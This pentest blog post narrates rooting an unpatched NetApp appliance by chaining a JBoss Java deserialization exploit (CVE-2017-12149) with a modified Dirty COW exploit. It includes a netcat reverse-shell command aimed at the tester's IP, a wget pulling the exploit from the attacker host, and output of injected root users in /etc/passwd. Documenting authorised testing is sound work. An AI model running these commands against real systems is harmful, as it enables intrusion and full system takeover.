---
layout: post
title: Deserialized Double Dirty
categories: [pentest, exploits]
tags: [java, deserialization, jboss, dirtycow, privilege escalation]
comments: true
---
Recently I was able to fully root an NetApp OnCommand Performance Manager appliance using a Java Deserialization vulnerability and Dirty Cow.  

Disclaimer: NetApp has security patches for both of these issues. This appliance simply had not been updated.

Late last year I ran into a device that was vulnerable to [CVE-2017-12149](https://nvd.nist.gov/vuln/detail/CVE-2017-12149) and was able to get a shell on that device. After using [Ysoserial](https://github.com/frohoff/ysoserial) and loading in the payloads in Burp Repeater (pro tip from @hateshaped: right click -> paste from file), I wanted to automate the building and delivery of the payload. I knew @byt3bl33d3r had a quite a few of these scripts on [Coalfire Lab's Github](https://github.com/Coalfire-Research/java-deserialization-exploits) so I modified a similar JBoss script for this specific vulnerability. The PoC can be found [here](https://github.com/jreppiks/CVE-2017-12149.git)

So when this popped up again, I was super excited. The system had a "modern" version of netcat, so ```nc -e``` worked just fine to grab a shell. 
```
python jdspoc.py --proto http --ysoserial-path ./ysoserial.jar 10.10.193.110:80 'nc -ne /bin/bash 192.168.3.230 8000'
```
This time, however, the admin (or perhaps NetApp) had done something right, the application was not running as root, but a low privilege user. 
```
 nc -lvp 8000
listening on [any] 8000 ...
192.168.193.110: inverse host lookup failed: Unknown host
connect to [192.168.3.230] from (UNKNOWN) [10.10.193.110] 34503
id
uid=998(jboss) gid=42(shadow) groups=1002(jboss),42(shadow)
```
While doing some enumeration, uname came back with the following:
```
Debian 3.2.68-1+deb7u1
```
Ripe for Dirty COW! The Dirty COW exploit I'm most familiar with is [Firefart's exploit](https://github.com/FireFart/dirtycow.git). It's stable and it works. I ran the exploit and it created the firefart user with no issues, but this is where it got interesting.

Typical "firefartage" one does ```su - firefart``` or ssh firefart@<ip>. However, I could not upgrade my shell to a TTY shell (I'm sure I'm saying that wrong...). I could not ```su``` since I didn't have a "real" terminal. I tried all the usual tricks (e.g. [Pentest Monkey's awesomeness](http://pentestmonkey.net/blog/post-exploitation-without-a-tty) and [Ropnop's great blog](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)) but not even stackoverflow could help me out! 
  
SSH was also a bust. The ssh server on the system was set up so only members of the maintenance group could log in and it could not be a root user. I decided to modify Firefart's code and make the firefart user an non-root user and add them to the maintenace group. I ran the exploit and it created the user! I was now able to ssh into the device. I was still not root, though. So, I ran the original exploit again thinking I could then just ```su - firefart```. When I tried that, it failed with an error: ```I have no name!``` 

Even, running the script twice with two different usernames ended in the same error. I decided I needed to modify the exploit code again to add both users at the same time. You can grab the modified code I lovingly named doubledirty [here](https://github.com/jreppiks/doubledirty.git) Please be kind, I am not a developer, but it complied and ran on the very first time, that has to count for something, right?!

I grabbed the new exploit code and ran it on the system:
```
jboss@netapp:/tmp$ wget 192.168.3.230:8080/doubledirty
wget 192.168.3.230:8080/doubledirty
--2019-08-16 14:28:23--  http://192.168.3.230:8080/doubledirty
Connecting to 192.168.3.230:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18200 (18K) [application/octet-stream]
Saving to: `doubledirty'

     0K .......... .......                                    100% 30.4M=0.001s

2019-08-16 14:28:23 (30.4 MB/s) - `doubledirty' saved [18200/18200]

jboss@netapp:/tmp$ ls -ltr
ls -ltr
total 696
drwx------ 2 root  root          4096 Feb  8  2016 vmware-root
-rw-r--r-- 1 root  root           654 Feb  8  2016 netapp-opm-postinst.log
-rw-r--r-- 1 jboss shadow       18200 Aug 16 14:27 doubledirty
jboss@netapp:/tmp$ chmod +x doubledirty
chmod +x doubledirty
jboss@netapp:/tmp$ ./doubledirty
./doubledirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Complete line:

jreppiksroot:2fe7ebe7ff742bf25fd67824bfed403a:0:0:pwned:/root:/bin/bash
jreppiks:2fe7ebe7ff742bf25fd67824bfed403a:14:1000:pwned:/root:/bin/bash
```

I was able to ssh in as the non-priveledged user and then su - to the root user!
```
# ssh jreppiks@10.10.193.110
Password: 
Linux netapp 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64
Last login: Fri Aug 16 11:48:49 2019 from 192.168.3.230
Could not chdir to home directory /root: Permission denied
-bash: /root/.bash_profile: Permission denied
jreppiks@netapp:/$ id
uid=14(jreppiks) gid=1000(maintenance) groups=1000(maintenance)
jreppiks@netapp:/$ su - jreppiksroot
Password: 
jreppiksroot@netapp:~# id
uid=0(jreppiksroot) gid=0(root) groups=0(root)
jreppiksroot@netapp:~# 
```
